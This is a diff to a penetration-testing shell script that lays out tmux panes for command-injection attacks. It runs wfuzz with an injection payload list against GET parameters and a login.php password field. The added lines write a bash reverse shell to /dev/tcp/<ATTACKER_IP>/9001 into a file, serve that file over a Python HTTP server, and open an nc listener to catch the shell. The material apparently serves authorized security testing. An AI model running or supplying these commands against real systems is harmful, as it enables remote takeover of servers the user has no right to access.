@@ -3195,6 +3195,7 @@ cd $folderProjectWebAuthN
 # Layout
 tmux new-window -t PT:4 -n 'WEB Command Injection Auto'
 tmux split-window -v -t PT:4.0
+tmux resize-pane -t PT:4.0 -y 3
 tmux split-window -v -t PT:4.1
 tmux select-pane -t "4.1"
 tmux split-window -h -t "4.1"
@@ -3233,6 +3234,12 @@ tmux send-keys -t PT:4.5"# command injection automation (GET)" Enter
 tmux send-keys -t PT:4.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:4.6 "# command injection automation (POST)" Enter
 tmux send-keys -t PT:4.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+tmux send-keys -t PT:4.7"# command injection automation: save revShell for linux in shell file" Enter
+tmux send-keys -t PT:4.7 "echo \"/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1\" > shell"
+tmux send-keys -t PT:4.8"# command injection automation: activate HTTP server" Enter
+tmux send-keys -t PT:4.8 "python3 -m http.server"
+tmux send-keys -t PT:4.9"# command injection automation: listener" Enter
+tmux send-keys -t PT:4.9 "nc -nlvp 9001"
 cd $folderProject
 
 
